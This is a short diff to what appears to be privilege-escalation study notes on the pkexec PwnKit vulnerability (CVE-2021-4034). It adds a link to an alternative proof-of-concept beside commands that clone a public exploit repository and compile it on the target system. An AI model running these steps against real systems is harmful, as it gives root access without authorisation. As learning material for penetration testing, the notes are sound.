@@ -96,6 +96,8 @@ In the `pkexec` tool, the memory corruption vulnerability with the identifier [C
 
 To exploit this vulnerability, we need to download a [PoC](https://github.com/arthepsy/CVE-2021-4034) and compile it on the target system itself or a copy we have made.
 ```bash
+# alternative poc https://codeload.github.com/berdav/CVE-2021-4034/zip/main 
+
 git clone https://github.com/arthepsy/CVE-2021-4034.git
 cd CVE-2021-4034
 gcc cve-2021-4034-poc.c -o poc
